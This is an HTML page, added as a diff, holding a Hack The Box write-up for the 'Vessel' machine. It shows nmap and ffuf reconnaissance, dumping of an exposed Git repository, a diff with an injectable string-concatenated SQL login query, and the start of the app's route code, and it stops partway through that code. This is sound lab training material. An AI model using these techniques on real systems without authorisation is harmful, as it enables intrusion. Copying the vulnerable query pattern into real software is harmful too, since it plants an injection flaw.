@@ -1,0 +1,644 @@
+<!doctype html><html lang="es"><head><title>Vessel | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Hard machine. This machine has a website that exposes a Git repository. Here we can read the source code of the web application and find out a way to bypass authentication in MySQL with Type Juggling. Then, we find another subdomain that has a public exploit to get RCE. After that, we discover a password generator tool that can be reverse-engineered to generate multiple passwords and crack a password-protected PDF document. Then, we get access via SSH and see that we can use sysctl as root with pinns as SUID binary. With this, we can modify the kernel configuration to run an arbitrary script with a program crashes, which leads to the privilege escalation"><meta itemprop="description" content="Hack The Box. Linux. Hard machine. This machine has a website that exposes a Git repository. Here we can read the source code of the web application and find out a way to bypass authentication in MySQL with Type Juggling. Then, we find another subdomain that has a public exploit to get RCE. After that, we discover a password generator tool that can be reverse-engineered to generate multiple passwords and crack a password-protected PDF document. Then, we get access via SSH and see that we can use sysctl as root with pinns as SUID binary. With this, we can modify the kernel configuration to run an arbitrary script with a program crashes, which leads to the privilege escalation"><meta name="twitter:card" content="Hack The Box. Linux. Hard machine. This machine has a website that exposes a Git repository. Here we can read the source code of the web application and find out a way to bypass authentication in MySQL with Type Juggling. Then, we find another subdomain that has a public exploit to get RCE. After that, we discover a password generator tool that can be reverse-engineered to generate multiple passwords and crack a password-protected PDF document. Then, we get access via SSH and see that we can use sysctl as root with pinns as SUID binary. With this, we can modify the kernel configuration to run an arbitrary script with a program crashes, which leads to the privilege escalation"><meta name="twitter:description" content="Hack The Box. Linux. Hard machine. This machine has a website that exposes a Git repository. Here we can read the source code of the web application and find out a way to bypass authentication in MySQL with Type Juggling. Then, we find another subdomain that has a public exploit to get RCE. After that, we discover a password generator tool that can be reverse-engineered to generate multiple passwords and crack a password-protected PDF document. Then, we get access via SSH and see that we can use sysctl as root with pinns as SUID binary. With this, we can modify the kernel configuration to run an arbitrary script with a program crashes, which leads to the privilege escalation"><meta property="og:description" content="Hack The Box. Linux. Hard machine. This machine has a website that exposes a Git repository. Here we can read the source code of the web application and find out a way to bypass authentication in MySQL with Type Juggling. Then, we find another subdomain that has a public exploit to get RCE. After that, we discover a password generator tool that can be reverse-engineered to generate multiple passwords and crack a password-protected PDF document. Then, we get access via SSH and see that we can use sysctl as root with pinns as SUID binary. With this, we can modify the kernel configuration to run an arbitrary script with a program crashes, which leads to the privilege escalation"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="image" content="https://7rocky.github.io/images/HTB/Vessel/Vessel.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Vessel/Vessel.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Vessel/Vessel.png"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta itemprop="name" content="Vessel"><meta property="twitter:title" content="Vessel"><meta property="og:title" content="Vessel"><meta property="og:url" content="https://7rocky.github.io/en/htb/vessel/"><meta itemprop="keywords" content="git,cve,python,express,suid,type-juggling,kernel-exploitation,reversing,rce,hash-cracking,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/vessel/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/vessel/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/vessel/&amp;text=Vessel" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/htb/vessel/&amp;title=Vessel" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Vessel</h1><time class="mt4 f6 dib tracked" datetime="2023-03-25T00:00:00+01:00">25 / 03 / 2023</time><br><p class="mb4 f6 dib tracked">15 minutes to read</p></header><div class="htb-image"><img alt="Vessel" src="/images/HTB/Vessel/Vessel.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/git" title="Git">Git</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/python" title="Python">Python</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/express" title="Express JS">Express JS</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/suid" title="SUID Binary">SUID Binary</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/type-juggling" title="Type Juggling">Type Juggling</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/kernel-exploitation" title="Kernel exploitation">Kernel exploitation</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/reversing" title="Reverse Engineering">Reverse Engineering</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/hash-cracking" title="Password hash cracking">Password hash cracking</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#git-enumeration">Git enumeration</a></li></ul></li><li><a href="#foothold">Foothold</a><ul><li><a href="#authentication-bypass">Authentication bypass</a></li><li><a href="#exploiting-a-cve">Exploiting a CVE</a></li></ul></li><li><a href="#system-enumeration">System enumeration</a><ul><li><a href="#reversing-a-windows-pe">Reversing a Windows PE</a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#kernel-exploitation">Kernel exploitation</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Hard</li><li><strong>IP Address</strong>: 10.10.11.178</li><li><strong>Release</strong>: 27 / 08 / 2022</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.178 -p 22,80
+Nmap scan report for 10.10.11.178
+Host is up (0.066s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 38c297327b9ec565b44b4ea330a59aa5 (RSA)
+|   256 33b355f4a17ff84e48dac5296313833d (ECDSA)
+|_  256 a1f1881c3a397274e6301f28b680254e (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-trane-info: Problem with XML parsing of /evox/about
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Vessel
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+# Nmap done -- 1 IP address (1 host up) scanned in 9.20 seconds
+</code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id="enumeration">Enumeration</h2><p>If we go to <code>http://10.10.11.178</code> we will see this landing page:</p><p><img src="/images/HTB/Vessel/Vessel-1.png" alt="Vessel 1"></p><p>At the bottom of the page we can see <code>Vessel.htb</code>:</p><p><img src="/images/HTB/Vessel/Vessel-2.png" alt="Vessel 2"></p><p>This probably means that there are subdomains (<code>&lt;subdomain>.vessel.htb</code>). However, using <code>gobuster</code> of <code>ffuf</code> to enumerate subdomains is not useful.</p><p>There is also a login form:</p><p><img src="/images/HTB/Vessel/Vessel-3.png" alt="Vessel 3"></p><p>But we don&rsquo;t have credentials. We can try to register a new account, but it is disabled:</p><p><img src="/images/HTB/Vessel/Vessel-4.png" alt="Vessel 4"></p><p>Therefore, let&rsquo;s use <code>ffuf</code> to enumerate more routes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.178/FUZZ -fw 4  
+
+<span class="code-dark-green">[Status: 200, Size: 2393, Words: 999, Lines: 52, Duration: 53ms]</span>
+    * FUZZ: 404
+
+<span class="code-dark-green">[Status: 200, Size: 2400, Words: 1029, Lines: 53, Duration: 69ms]</span>
+    * FUZZ: 401
+
+<span class="code-dark-green">[Status: 200, Size: 2335, Words: 991, Lines: 52, Duration: 45ms]</span>
+    * FUZZ: 500
+
+<span class="code-dark-green">[Status: 200, Size: 4213, Words: 1929, Lines: 71, Duration: 109ms]</span>
+    * FUZZ: Login
+
+<span class="code-dark-blue">[Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 51ms]</span>
+    * FUZZ: css
+
+<span class="code-dark-blue">[Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 54ms]</span>
+    * FUZZ: dev
+
+<span class="code-dark-blue">[Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 56ms]</span>
+    * FUZZ: img
+
+<span class="code-dark-blue">[Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 46ms]</span>
+    * FUZZ: js
+
+<span class="code-dark-green">[Status: 200, Size: 4213, Words: 1929, Lines: 71, Duration: 50ms]</span>
+    * FUZZ: login
+
+<span class="code-dark-green">[Status: 200, Size: 5830, Words: 3040, Lines: 90, Duration: 48ms]</span>
+    * FUZZ: register
+
+<span class="code-dark-yellow">[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 47ms]</span>
+    * FUZZ: server-status
+</code></pre></div><p>One that stands out is <code>/dev</code>. Let&rsquo;s fuzz a bit more:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.178/dev/FUZZ -fw 4  
+
+<span class="code-dark-green">[Status: 200, Size: 2607, Words: 18, Lines: 19, Duration: 57ms]</span>
+    * FUZZ: .git/index
+
+<span class="code-dark-green">[Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 2787ms]</span>
+    * FUZZ: .git/HEAD
+
+<span class="code-dark-green">[Status: 200, Size: 139, Words: 13, Lines: 9, Duration: 4823ms]</span>
+    * FUZZ: .git/config
+</code></pre></div><p>Nice, there is an exposed Git repository.</p><h3 id="git-enumeration">Git enumeration</h3><p>We can use <a href="https://pypi.org/project/git-dumper/"><code>git-dumper</code></a> to extract the repository:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git-dumper</span> http://10.10.11.178/dev/.git/ <span class="mtku">.</span>
+[-] Testing http://10.10.11.178/dev/.git/HEAD [200]
+[-] Testing http://10.10.11.178/dev/.git/ [302]
+[-] Fetching common files
+[-] Fetching http://10.10.11.178/dev/.gitignore [302]
+[-] http://10.10.11.178/dev/.gitignore responded with status code 302
+[-] Fetching http://10.10.11.178/dev/.git/COMMIT_EDITMSG [200]
+
+...
+
+[-] Fetching http://10.10.11.178/dev/.git/objects/49/ef68c4ae55c19adc05c4222b582236d6b0ffcb [200]  
+[-] Fetching http://10.10.11.178/dev/.git/objects/fa/3044c0c0fac573dad6a50c52bcf6f55c7c7bb3 [200]
+[-] Fetching http://10.10.11.178/dev/.git/objects/7f/79dd8b84759d6fef9e51e1dfe95f2e89823a8e [200]
+[-] Fetching http://10.10.11.178/dev/.git/objects/d0/2d9b464fe19e78d4cda32b7e19ae62200c7140 [200]
+[-] Running git checkout .
+</code></pre></div><p>We have this Node.js project:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">tree</span>
+.
+├── config
+│   └── db.js
+├── index.js
+├── public
+│   ├── css
+│   │   ├── style.css
+│   │   └── styles.css
+│   ├── img
+│   │   ├── bg-masthead.jpg
+│   │   ├── error-404-monochrome.svg  
+│   │   ├── favicon.ico
+│   │   ├── portfolio
+│   │   │   └── thumbnails
+│   │   │       ├── 1.jpg
+│   │   │       ├── 2.jpg
+│   │   │       ├── 3.jpg
+│   │   │       ├── 4.jpg
+│   │   │       ├── 5.jpg
+│   │   │       ├── 6.jpg
+│   │   │       └── images.zip
+│   │   └── profile.jpg
+│   └── js
+│       ├── script.js
+│       └── scripts.js
+├── routes
+│   └── index.js
+└── views
+    ├── 401.ejs
+    ├── 404.ejs
+    ├── 500.ejs
+    ├── index.ejs
+    ├── login.ejs
+    ├── register.ejs
+    └── reset.ejs
+
+10 directories, 25 files
+</code></pre></div><p>This is the commit history:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> log
+<span class="code-dark-yellow">commit 208167e785aae5b052a4a2f9843d74e733fbd917 (<span class="code-cyan">HEAD -&gt; </span><span class="code-green">master</span>)</span>  
+Author: Ethan &lt;ethan@vessel.htb&gt;
+Date:   Mon Aug 22 10:11:34 2022 -0400
+
+    Potential security fixes
+
+<span class="code-dark-yellow">commit edb18f3e0cd9ee39769ff3951eeb799dd1d8517e</span>
+Author: Ethan &lt;ethan@vessel.htb&gt;
+Date:   Fri Aug 12 14:19:19 2022 -0400
+
+    Security Fixes
+
+<span class="code-dark-yellow">commit f1369cfecb4a3125ec4060f1a725ce4aa6cbecd3</span>
+Author: Ethan &lt;ethan@vessel.htb&gt;
+Date:   Wed Aug 10 15:16:56 2022 -0400
+
+    Initial commit
+</code></pre></div><p>However, there is nothing useful. In fact, it looks like the project was updated because of some vulnerable SQL queries:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> show 2081
+<span class="code-dark-yellow">commit 208167e785aae5b052a4a2f9843d74e733fbd917 (<span class="code-cyan">HEAD -&gt; </span><span class="code-green">master</span>)</span>
+Author: Ethan &lt;ethan@vessel.htb&gt;
+Date:   Mon Aug 22 10:11:34 2022 -0400
+
+    Potential security fixes
+
+<span class="code-white">diff --git a/routes/index.js b/routes/index.js</span>
+<span class="code-white">index 0cf479c..69c22be 100644</span>
+<span class="code-white">--- a/routes/index.js</span>
+<span class="code-white">+++ b/routes/index.js</span>
+<span class="code-dark-cyan">@@ -1,6 +1,6 @@</span>
+ var express = require('express');
+ var router = express.Router();
+<span class="code-dark-red">-var mysql = require('mysql');</span>
+<span class="code-dark-green">+var mysql = require('mysql'); /* Upgraded deprecated mysqljs */</span>
+ var flash = require('connect-flash');
+ var db = require('../config/db.js');
+ var connection = mysql.createConnection(db.db)
+
+<span class="code-cyan">$</span> <span class="code-dark-green">git</span> show edb1
+<span class="code-dark-yellow">commit edb18f3e0cd9ee39769ff3951eeb799dd1d8517e</span>
+Author: Ethan &lt;ethan@vessel.htb&gt;
+Date:   Fri Aug 12 14:19:19 2022 -0400
+
+    Security Fixes
+
+<span class="code-white">diff --git a/routes/index.js b/routes/index.js</span>
+<span class="code-white">index be2adb1..0cf479c 100644</span>
+<span class="code-white">--- a/routes/index.js</span>
+<span class="code-white">+++ b/routes/index.js</span>
+<span class="code-dark-cyan">@@ -61,7 +61,7 @@</span> router.post('/api/login', function(req, res) {
+        let username = req.body.username;
+        let password = req.body.password;
+        if (username && password) {
+<span class="code-dark-red">-               connection.query("SELECT * FROM accounts WHERE username = '" + username + "' AND password = '" + password + "'", function(error, results, fields) {</span>  
+<span class="code-dark-green">+</span>               <span class="code-dark-green">connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) {</span>
+                        if (error) throw error;
+                        if (results.length &gt; 0) {
+                                req.session.loggedin = true;
+</code></pre></div><p>There are database credentials at <code>config/db.js</code>. But the relevant file is <code>routes/index.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">var</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'express'</span><span class="mtk1">);</span>
+<span class="mtk7 mtki">var</span><span class="mtk1"> </span><span class="mtk1">router</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">Router</span><span class="mtk1">();</span>
+<span class="mtk7 mtki">var</span><span class="mtk1"> mysql </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'mysql'</span><span class="mtk1">); </span><span class="mtk3">/* Upgraded deprecated mysqljs */</span>
+<span class="mtk7 mtki">var</span><span class="mtk1"> </span><span class="mtk8">flash</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'connect-flash'</span><span class="mtk1">);</span>
+<span class="mtk7 mtki">var</span><span class="mtk1"> db </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'../config/db.js'</span><span class="mtk1">);</span>
+<span class="mtk7 mtki">var</span><span class="mtk1"> </span><span class="mtk1">connection</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> mysql.</span><span class="mtk8">createConnection</span><span class="mtk1">(db.db)</span>
+
+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'index'</span><span class="mtk1">);</span>
+<span class="mtk1">});</span>
+
+<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">, </span><span class="mtk7 mtki">function</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'login'</span><span class="mtk1">, { </span><span class="mtk1">logged</span><span class="mtk1"> : </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk8">flash</span><span class="mtk1">(</span><span class="mtk4">'error'</span><span class="mtk1">) });</span>
+<span class="mtk1">});</span>
+
